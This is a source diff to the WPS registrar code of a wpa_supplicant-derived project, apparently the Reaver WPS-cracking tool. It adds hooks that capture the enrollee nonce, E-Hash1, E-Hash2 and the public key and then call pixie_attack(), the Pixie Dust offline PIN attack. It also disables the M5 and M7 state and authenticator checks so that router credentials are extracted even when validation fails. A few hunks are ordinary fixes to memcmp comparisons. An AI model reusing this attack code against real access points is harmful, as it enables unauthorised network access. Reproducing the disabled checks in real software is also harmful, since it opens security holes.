@@ -25,6 +25,7 @@
 #include "wps_i.h"
 #include "wps_dev_attr.h"
 #include "../misc.h"
+#include "pixie.h"
 
 #define WPS_WORKAROUNDS
 
@@ -1469,7 +1470,7 @@ static struct wpabuf * wps_build_m4(struct wps_data *wps)
 
 	wpa_printf(MSG_DEBUG, "WPS: Building Message M4");
 
-	wpa_printf(MSG_DEBUG, "WPS: Dev Password Len: %d", wps->dev_password_len);
+	wpa_printf(MSG_DEBUG, "WPS: Dev Password Len: %zu", wps->dev_password_len);
 	wpa_printf(MSG_DEBUG, "WPS: Dev Password: %s", wps->dev_password);
 
 	wps_derive_psk(wps, wps->dev_password, wps->dev_password_len);
@@ -1695,6 +1696,12 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
 	wpa_hexdump(MSG_DEBUG, "WPS: Enrollee Nonce",
 		    wps->nonce_e, WPS_NONCE_LEN);
 
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->nonce_e, WPS_NONCE_LEN, buf);
+		PIXIE_SET(enonce, buf);
+	}
+
 	return 0;
 }
 
@@ -1753,6 +1760,12 @@ static int wps_process_e_hash1(struct wps_data *wps, const u8 *e_hash1)
 	os_memcpy(wps->peer_hash1, e_hash1, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash1", wps->peer_hash1, WPS_HASH_LEN);
 
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->peer_hash1, WPS_HASH_LEN, buf);
+		PIXIE_SET(ehash1, buf);
+	}
+
 	return 0;
 }
 
@@ -1766,6 +1779,14 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 
 	os_memcpy(wps->peer_hash2, e_hash2, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash2", wps->peer_hash2, WPS_HASH_LEN);
+
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(wps->peer_hash2, WPS_HASH_LEN, buf);
+		PIXIE_SET(ehash2, buf);
+
+		pixie_attack();
+	}
 
 	return 0;
 }
@@ -1898,6 +1919,12 @@ static int wps_process_pubkey(struct wps_data *wps, const u8 *pk,
 	wps->dh_pubkey_e = wpabuf_alloc_copy(pk, pk_len);
 	if (wps->dh_pubkey_e == NULL)
 		return -1;
+
+	if(pixie.do_pixie) {
+		char buf[2048];
+		pixie_format(pk, 192, buf);
+		PIXIE_SET(pke, buf);
+	}
 
 	return 0;
 }
@@ -2226,8 +2253,12 @@ static enum wps_process_res wps_process_m5(struct wps_data *wps,
 	if (wps->state != RECV_M5) {
 		wpa_printf(MSG_DEBUG, "WPS: Unexpected state (%d) for "
 			   "receiving M5", wps->state);
+#if 0
 		wps->state = SEND_WSC_NACK;
 		return WPS_CONTINUE;
+#else
+		wps->state = RECV_M5;
+#endif
 	}
 
 	if (wps->pbc && wps->wps->registrar->force_pbc_overlap) {
@@ -2240,8 +2271,10 @@ static enum wps_process_res wps_process_m5(struct wps_data *wps,
 
 	if (wps_process_registrar_nonce(wps, attr->registrar_nonce) ||
 	    wps_process_authenticator(wps, attr->authenticator, msg)) {
+#if 0
 		wps->state = SEND_WSC_NACK;
 		return WPS_CONTINUE;
+#endif
 	}
 
 	decrypted = wps_decrypt_encr_settings(wps, attr->encr_settings,
@@ -2357,8 +2390,12 @@ static enum wps_process_res wps_process_m7(struct wps_data *wps,
 	if (wps->state != RECV_M7) {
 		wpa_printf(MSG_DEBUG, "WPS: Unexpected state (%d) for "
 			   "receiving M7", wps->state);
+#if 0
 		wps->state = SEND_WSC_NACK;
 		return WPS_CONTINUE;
+#else
+		wps->state = RECV_M7;
+#endif
 	}
 
 	if (wps->pbc && wps->wps->registrar->force_pbc_overlap) {
@@ -2371,8 +2408,10 @@ static enum wps_process_res wps_process_m7(struct wps_data *wps,
 
 	if (wps_process_registrar_nonce(wps, attr->registrar_nonce) ||
 	    wps_process_authenticator(wps, attr->authenticator, msg)) {
+#if 0
 		wps->state = SEND_WSC_NACK;
 		return WPS_CONTINUE;
+#endif
 	}
 
 	decrypted = wps_decrypt_encr_settings(wps, attr->encr_settings,
@@ -2388,16 +2427,17 @@ static enum wps_process_res wps_process_m7(struct wps_data *wps,
 		   "attribute");
 
 	/* @@@ One of these fails, but we don't really care. We just want the ap settings */
-	/*
 	if (wps_parse_msg(decrypted, &eattr) < 0 ||
 	    wps_process_key_wrap_auth(wps, decrypted, eattr.key_wrap_auth) ||
 	    wps_process_e_snonce2(wps, eattr.e_snonce2) ||
 	    wps_process_ap_settings_r(wps, &eattr)) {
+
+#if 0
 		wpabuf_free(decrypted);
 		wps->state = SEND_WSC_NACK;
 		return WPS_CONTINUE;
+#endif
 	}
-	*/
 
 	if(wps_parse_msg(decrypted, &eattr) >= 0)
 	{
@@ -2438,7 +2478,7 @@ static enum wps_process_res wps_process_wsc_msg(struct wps_data *wps,
 	if (*attr.msg_type != WPS_M1 &&
 	    (attr.registrar_nonce == NULL ||
 	     os_memcmp(wps->nonce_r, attr.registrar_nonce,
-		       WPS_NONCE_LEN != 0))) {
+		       WPS_NONCE_LEN) != 0)) {
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in registrar nonce");
 		return WPS_FAILURE;
 	}
@@ -2533,14 +2573,14 @@ static enum wps_process_res wps_process_wsc_ack(struct wps_data *wps,
 #endif /* CONFIG_WPS_UPNP */
 
 	if (attr.registrar_nonce == NULL ||
-	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN != 0))
+	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN) != 0)
 	{
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in registrar nonce");
 		return WPS_FAILURE;
 	}
 
 	if (attr.enrollee_nonce == NULL ||
-	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN != 0)) {
+	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN) != 0) {
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in enrollee nonce");
 		return WPS_FAILURE;
 	}
@@ -2607,14 +2647,14 @@ static enum wps_process_res wps_process_wsc_nack(struct wps_data *wps,
 #endif /* CONFIG_WPS_UPNP */
 
 	if (attr.registrar_nonce == NULL ||
-	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN != 0))
+	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN) != 0)
 	{
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in registrar nonce");
 		return WPS_FAILURE;
 	}
 
 	if (attr.enrollee_nonce == NULL ||
-	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN != 0)) {
+	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN) != 0) {
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in enrollee nonce");
 		return WPS_FAILURE;
 	}
@@ -2694,14 +2734,14 @@ static enum wps_process_res wps_process_wsc_done(struct wps_data *wps,
 #endif /* CONFIG_WPS_UPNP */
 
 	if (attr.registrar_nonce == NULL ||
-	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN != 0))
+	    os_memcmp(wps->nonce_r, attr.registrar_nonce, WPS_NONCE_LEN) != 0)
 	{
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in registrar nonce");
 		return WPS_FAILURE;
 	}
 
 	if (attr.enrollee_nonce == NULL ||
-	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN != 0)) {
+	    os_memcmp(wps->nonce_e, attr.enrollee_nonce, WPS_NONCE_LEN) != 0) {
 		wpa_printf(MSG_DEBUG, "WPS: Mismatch in enrollee nonce");
 		return WPS_FAILURE;
 	}
